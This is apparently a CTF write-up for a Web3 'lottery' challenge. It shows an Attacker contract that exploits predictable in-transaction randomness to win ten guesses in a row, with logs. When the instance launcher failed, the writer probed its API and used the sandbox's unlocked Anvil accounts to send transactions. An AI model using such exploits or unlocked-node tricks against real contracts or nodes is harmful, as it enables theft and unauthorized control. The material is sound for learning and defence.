# lottery - Web3 (299 pts)

**Flag:** `CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}`
**Attached file:** `Lottery.sol` (1153 B, SHA256: `38f58ac2...`), `Setup.sol` (314 B, SHA256: `ebb2b795...`)

## Challenge

The challenge provides two Solidity structure files and a network service operating at the address `34.116.80.78:31338`. The `Lottery.sol` source code maintains a mechanism to record winning streaks. For each call to the `guess(_guess)` function, the smart contract calculates the target parameter `target = random() % 100`. If the guess is correct, the `streaks[msg.sender]` counter is incremented by 1; if incorrect, this variable is reset to 0. When the winning streak reaches a threshold of 10 consecutive times, the authority to designate `winner = msg.sender` will be activated. The `Setup.sol` file contains only a single victory validation condition:

```solidity
function isSolved() external view returns (bool) {
    return lottery.winner() != address(0);
}
```

The protocol via netcat (nc) divides the system into a trio of operations: `1 launch new instance`, `2 kill instance`, and `3 get flag`. The initialization command (1) will output a UUID identifier, an RPC endpoint, a private key, and the Setup contract address. The login process uses an authentication code (Ticket) identifying the competing team's name, noting that it is case-sensitive.

## Analysis

Technical evaluation on the `Lottery.sol` file identified three critical logic vulnerabilities:

1. `random()` function architecture: The function is designated with the `view` modifier, takes no input parameters, and relies solely on hashing the components `blockhash(block.number - 1)`, `block.timestamp`, `block.difficulty`. Because within the same transaction cycle, these three block constant values are immutable, `random()` will generate the exact same result for every call within a transaction.
2. `target` value generation process: The `guess()` function recalculates the `target = random() % 100` variable using the exact same formula as the `random()` function. The contract does not use a random salt value or any independent secret storage mechanism.
3. No quota mechanism exists: The contract lacks censorship conditions (`require`) limiting the number of `guess` function calls per transaction, and also imposes no restrictions checking `tx.origin`.

`isSolved()` checks only `winner != address(0)`, so a contract can be the winner. A helper contract can run ten iterations of `{ t = random()%100; guess(t) }` in a single transaction.

The RPC reports `eth_chainId = 0x1` and a block number around `26096389`. Anvil reports `block.difficulty = 0` in this instance. The exploit relies on the block values remaining unchanged within a transaction; it does not need to predict them in advance.

## Solution

**Step 1 - Initialize the Attacker contract integrating a multi-step transaction.**
To ensure the `random()` parameter is always a constant, the entire process of sending the sequence of 10 guesses must be packaged into a single transaction cycle:

```solidity
contract Attacker {
    address public immutable lottery;
    constructor(address _lottery) { lottery = _lottery; }
    function run(uint256 _n) external {
        for (uint256 i = 0; i < _n; i++) {
            uint256 target = ILottery(lottery).random() % 100;
            ILottery(lottery).guess(target);
        }
    }
}
```

Testing on a local simulation model that is fully compatible with the original `Setup.sol` structure: calling the `run(10)` function consumes a total of 117,955 gas, the `winner` state variable updates to the attacker's address, and the `isSolved()` function returns a `true` state.

**Step 2 - Analyze the instance provisioning system failure.**
The initialization system (Launcher) experienced a crash from 13:50 to 15:51. Function `1` (launch) outputted a JSON parsing error warning string: `json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)` at the path `eth_sandbox/launcher.py:99`. This phenomenon affirms the server at the `/new` endpoint returned unstructured JSON data. During this time, making a `GET http://34.116.80.78:8546/` call still displayed the `sandbox is running!` status. Sending a `POST /new` request accompanied by a fake bearer triggered a standard JSON return, proving the API was still operational but failing in the authentication processing stream:

```text
http=200 bytes=32 type=application/json
{"error":"nice try","ok":false}
```

After the system recovered, function `1` only provided two data streams (UUID and RPC) and halted:

```text
uuid:           17d5c78a-b92e-480c-aa67-4d60eb754b44
rpc endpoint:   http://34.116.80.78:8546/17d5c78a-b92e-480c-aa67-4d60eb754b44
```

The system lost the ability to provide the private key and the setup contract address. Nevertheless, because the network instance (RPC endpoint) was still active, exploitation would continue using a different method without needing to send a relaunch command.

**Step 3 - Deploy transactions under Missing Private Key conditions.**
Analyzing the sandbox's `server.py` security filter: the system applies a blocking mechanism based on protocol namespaces, and the specific configuration only bans `eth_sendUnsignedTransaction`. Identification commands like `anvil_*` are also rejected (`invalid request`), but the fundamental `eth_sendTransaction` command is not restricted. The internal Anvil server inherently boots up with all default accounts unlocked, therefore it's possible to command the network node itself to forge the signature (sign):

```text
-- List of accounts
["0xacccf717a6a03135d282e3b2767210106c7eab1c","0x6fbc29b5519b8e3f757f950e80db05af5dcb000e"]
-- Verify sendTransaction sending permissions
{"jsonrpc":"2.0","id":3,"result":"0x2468973e8cf8f206bd15b21ae47fae613a9d9f3fc22814ccf1253463f7ca53bf"}
```

Result: The `accounts[0]` account is the deployer account that built the `Setup` structure, while `accounts[1]` is the player account. Both carry an available balance of up to 5000 ETH (`0x10f0cf064dd59200000`).

**Step 4 - Reverse calculate the Contract Address.**
The `Setup` structure was initialized by the deployer account at a nonce state of 0. The `Lottery` structure was subsequently created by `Setup` with a nonce parameter of 1. Interpolating the network space (CREATE hash arithmetic) allows determining the address without requiring the system to return it:

```python
def create_address(sender, nonce):
    h = keccak.new(digest_bits=256)
    h.update(rlp.encode([bytes.fromhex(sender[2:]), nonce]))
    return to_checksum_address("0x" + h.digest()[12:].hex())
```

The computed address contains exactly 726 bytes of code. When querying the `lottery()` call function, it subsequently returns another address, confirming this is the system's original `Setup` address:

```text
Address candidate 0xE5Bf39E2a633f350eA183716b898b601530cBc85 code length 726 bytes -> routed to lottery() 0x13b4Edba63FAcaDC68232DAFDAaF31f76Ca72A3b
```

**Step 5 - Execute the exploit.**
Deploy the `Attacker(lottery)` contract via the `accounts[1]` account, execute the `run(10)` call function:

```text
Attacker deployed: Address 0xF9351e4ad9D74d9683ABc494a4AA389C0F1A98C2 status 0x1
Execute run(10) status: 0x1 gas resources consumed: 135055
winner status: 0xF9351e4ad9D74d9683ABc494a4AA389C0F1A98C2
Verify isSolved: True
```

**Step 6 - Retrieve the Flag.**
The flag block is not stored on-chain. The launcher's `get_flag` function operates independently by reading the team identifier file `/tmp/<team_id>` (this file is generated by the system immediately upon successful deployment) and then communicating with the RPC to query the `isSolved()` variable. Use manipulation command `3` combined with the identifier code (Ticket):

```text
>> 3
ticket please:
>> R3:TURИ
CSS{U5E_4_R4ND0M_FUNCT10N}
```
**Repeat check:** Requests at 15:55:15 and 15:56:03 returned the same flag. Afterward, operation `2` with the ticket returned `Instance killed`.

## Result

Executing the flag extraction command:

```bash
python exploit.py http://34.116.80.78:8546/17d5c78a-b92e-480c-aa67-4d60eb754b44 "R3:TURИ"
```

Data output:
```text
CSS{U5E_4_R4ND0M_FUNCT10N}
Override format: CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}
```

## Reproduce

Reproduce:

```bash
python exploit.py <instance-rpc-endpoint> "<team name>"
```
The script obtains unlocked accounts from the RPC, derives the `Setup` address using CREATE, checks its getter, deploys `analysis/Attacker.sol`, and requests the flag. It does not need the private key or Setup address from the launcher. A local reproduction uses the following Anvil configuration:

```bash
anvil --chain-id 31337 --block-base-fee-per-gas 0 --accounts 2 --balance 5000
```
